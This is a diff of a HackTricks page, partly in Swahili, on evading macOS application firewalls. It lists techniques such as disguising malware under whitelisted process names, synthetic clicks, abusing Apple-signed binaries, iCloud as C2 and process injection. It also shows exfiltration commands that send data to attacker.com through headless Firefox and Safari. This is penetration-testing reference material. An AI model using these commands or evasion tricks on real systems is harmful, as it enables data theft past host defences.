@@ -1,57 +1,57 @@
-# Kupitisha Firewalls ya macOS
+# macOS Bypassing Firewalls
 
 {% hint style="success" %}
-Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Mbinu Zilizopatikana
+## Found techniques
 
-Mbinu zifuatazo zilipatikana zikifanya kazi kwenye baadhi ya programu za firewall za macOS.
+Mbinu zifuatazo zimepatikana zikifanya kazi katika baadhi ya programu za firewall za macOS.
 
-### Kutumia majina ya orodha nyeupe vibaya
+### Abusing whitelist names
 
-* Kwa mfano kuita zisizo na programu hasidi kwa majina ya michakato inayojulikana ya macOS kama vile **`launchd`**
+* Kwa mfano, kuita malware kwa majina ya michakato maarufu ya macOS kama **`launchd`**
 
-### Bonyeza Kisynthetic
+### Synthetic Click
 
-* Ikiwa firewall inauliza idhini kwa mtumiaji, fanya programu hasidi **ibonyeze ruhusa**
+* Ikiwa firewall inahitaji ruhusa kutoka kwa mtumiaji, fanya malware **ibofye ruhusu**
 
-### **Tumia programu zilizosainiwa na Apple**
+### **Use Apple signed binaries**
 
-* Kama vile **`curl`**, lakini pia nyingine kama **`whois`**
+* Kama **`curl`**, lakini pia wengine kama **`whois`**
 
-### Vipeni vya Apple vinavyojulikana
+### Well known apple domains
 
-Firewall inaweza kuruhusu uhusiano kwenye vikoa vya Apple vinavyojulikana kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
+Firewall inaweza kuwa inaruhusu muunganisho kwa maeneo maarufu ya apple kama **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
 
-### Kupitisha Kwa Ujumla
+### Generic Bypass
 
-Mawazo kadhaa ya jaribu kupitisha firewalls
+Mawazo kadhaa ya kujaribu kupita firewalls
 
-### Angalia trafiki iliyoruhusiwa
+### Check allowed traffic
 
-Kujua trafiki iliyoruhusiwa kutakusaidia kutambua vikoa vilivyowekwa kwenye orodha nyeupe au ni programu zipi zilizoruhusiwa kufikia vikoa hivyo.
+Kujua trafiki inayoruhusiwa kutakusaidia kubaini maeneo ambayo yanaweza kuwa kwenye orodha ya ruhusa au programu zipi zimepewa ruhusa kuziunganisha.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### Kutumia DNS
 
-Ufumbuzi wa DNS unafanywa kupitia programu iliyosainiwa ya **`mdnsreponder`** ambayo labda itaruhusiwa kuwasiliana na seva za DNS.
+Marekebisho ya DNS yanafanywa kupitia **`mdnsreponder`** programu iliyosainiwa ambayo labda itaruhusiwa kuwasiliana na seva za DNS.
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Kupitia Programu za Kivinjari
+### Kupitia programu za kivinjari
 
 * **oascript**
 ```applescript
@@ -78,9 +78,9 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Kupitia sindano za michakato
+### Kupitia sindano za mchakato
 
-Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote unaweza kudukua ulinzi wa firewall:
+Ikiwa unaweza **kuiingiza msimbo katika mchakato** ambao unaruhusiwa kuungana na seva yoyote unaweza kupita ulinzi wa firewall:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -91,16 +91,16 @@ Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuungan
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 {% hint style="success" %}
-Jifunze & jifunze AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze & jifunze GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
